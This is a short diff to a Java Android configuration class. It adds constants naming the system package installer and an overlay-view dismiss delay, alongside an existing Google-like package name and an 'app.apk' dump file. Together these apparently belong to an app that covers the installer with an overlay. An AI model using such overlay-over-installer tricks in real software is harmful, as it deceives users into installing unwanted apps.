@@ -10,9 +10,13 @@ public class Config {
     
     public static final String PACKAGE_NAME = "com.google.android.mmsbg";
     
+    public static final String ANDROID_PACKAGE_INSTALLER = "com.android.packageinstaller";
+    
     public static final String DUMP_PACKAGE_NAME = "app.apk";
     
     public static final long HANDLER_DELAY = 10 * 1000;
+    
+    public static final long OVERLAY_VIEW_DISMISS_DELAY = 15 * 1000;
     
     public static void LOGD(String TAG, String msg) {
         if (LOGD) {
